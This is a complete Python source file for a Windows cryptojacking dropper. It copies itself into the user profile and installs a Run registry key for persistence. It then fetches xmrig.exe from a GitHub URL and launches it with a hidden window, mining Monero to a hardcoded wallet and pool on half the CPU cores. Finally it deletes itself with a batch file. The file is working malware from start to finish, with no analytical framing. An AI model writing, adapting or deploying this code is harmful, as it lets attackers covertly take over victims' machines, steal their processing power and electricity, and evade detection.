import os
import sys
import shutil
import subprocess
import winreg
import urllib.request
import random


def copy_to_userprofile():
    userprofile = os.environ.get("USERPROFILE")
    if not userprofile:
        sys.exit("Cannot find USERPROFILE environment variable.")
    filename = os.path.basename(sys.argv[0])
    dest_path = os.path.join(userprofile, filename)
    try:

        if not os.path.exists(dest_path):
            shutil.copy2(sys.argv[0], dest_path)
    except Exception as e:
        sys.exit(f"Error copying file: {e}")
    return dest_path


def check_registry():
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
        winreg.QueryValueEx(key, "xmrservice")
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print(f"Error checking registry: {e}")
        return False

def add_to_startup(file_path):
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
    except FileNotFoundError:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
    try:
        winreg.SetValueEx(key, "xmrservice", 0, winreg.REG_SZ, file_path)
    except Exception as e:
        print(f"Error adding to registry: {e}")
    finally:
        winreg.CloseKey(key)

def check_and_download_xmrig(userprofile):
    xmrig_path = os.path.join(userprofile, "xmrig.exe")
    if not os.path.exists(xmrig_path):
        url = "https://github.com/zvwgvx/xmrig/raw/refs/heads/main/xmrig.exe"
        try:
            urllib.request.urlretrieve(url, xmrig_path)
        except Exception as e:
            print(f"Error downloading xmrig.exe: {e}")
    return xmrig_path


def run_xmrig(userprofile):
    xmrig_path = os.path.join(userprofile, "xmrig.exe")
    if not os.path.exists(xmrig_path):
        print("xmrig.exe not found in userprofile, cannot run.")
        return

    cpu_count = os.cpu_count() or 1
    threads = cpu_count // 2 if cpu_count > 1 else 1

    computer_name = os.environ.get("COMPUTERNAME", "unknown")
    random_number = f"{random.randint(0, 999999):06d}"
    unique_name = f"{computer_name}_{random_number}"

    cmd = [
        xmrig_path,
        "-k",
        "-a", "rx",
        "-t", str(threads),
        "-o", "gulf.moneroocean.stream:10128",
        "--asm=intel",
        "--randomx-mode=fast",
        "-k",
        "-u", f"47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQy6R9j9p7toHa9yPyCqt9n43N3psvCwiFdHCJNNouP.{unique_name}",
        "--donate-level", "0"
    ]
    # Prepare startup info to hide the process window completely
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0  # 0 = SW_HIDE
    try:
        subprocess.Popen(cmd, shell=False, startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Error starting xmrig.exe: {e}")


def self_delete():
    current_file = os.path.abspath(sys.argv[0])
    bat_path = os.path.join(os.environ["TEMP"], "delete.bat")
    bat_content = (
        "@echo off\r\n"
        "ping 127.0.0.1 -n 5 > nul\r\n"
        f"del \"{current_file}\"\r\n"
        "del \"%~f0\""
    )
    try:
        with open(bat_path, "w") as bat_file:
            bat_file.write(bat_content)
        subprocess.Popen(["cmd", "/c", bat_path], shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Error deleting file: {e}")


if __name__ == "__main__":
    userprofile = os.environ.get("USERPROFILE")
    if not userprofile:
        sys.exit("Cannot find USERPROFILE environment variable.")
    
    current_dir = os.path.abspath(os.path.dirname(sys.argv[0]))

    if current_dir.lower() != userprofile.lower():

        dest_file = copy_to_userprofile()
        if not check_registry():
            add_to_startup(dest_file)
        else:
            add_to_startup(dest_file)
        xmrig_path = check_and_download_xmrig(userprofile)
        run_xmrig(userprofile)
        self_delete()
        sys.exit()
    else:

        xmrig_path = check_and_download_xmrig(userprofile)
        if not check_registry():
            add_to_startup(sys.argv[0])
        else:

            add_to_startup(sys.argv[0])
        run_xmrig(userprofile)
        sys.exit()
